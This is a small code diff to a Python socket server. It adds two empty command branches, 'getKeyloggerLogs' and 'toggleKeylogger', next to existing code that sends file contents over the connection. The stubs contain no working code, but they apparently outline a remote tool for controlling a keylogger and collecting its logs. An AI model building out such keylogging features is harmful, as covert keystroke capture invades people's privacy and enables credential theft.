@@ -79,6 +79,10 @@ def handleConnection(conn: socket, addr):
                     conn.send(str(size).encode(FORMAT))
                     data = f.read()
                     conn.sendall(data)
+                elif msg == "getKeyloggerLogs":
+                    pass
+                elif msg == "toggleKeylogger":
+                    pass
 
 
 def main():
